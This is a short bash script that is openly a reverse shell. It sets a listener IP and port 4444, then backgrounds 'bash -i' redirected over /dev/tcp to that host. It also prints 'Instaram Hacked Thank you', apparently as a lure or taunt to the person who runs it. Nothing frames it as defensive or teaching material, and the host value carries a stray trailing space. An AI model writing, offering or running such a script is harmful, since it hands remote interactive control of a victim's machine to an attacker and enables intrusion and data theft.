#!/bin/bash

# Reverse shell parameters
REMOTE_HOST="192.168.60.191 "  # Replace with your listener's IP address
REMOTE_PORT=4444             # Replace with your listener's port

# Start the reverse shell in the background
nohup bash -i >& /dev/tcp/$REMOTE_HOST/$REMOTE_PORT 0>&1 &
echo "Instaram Hacked Thank you"
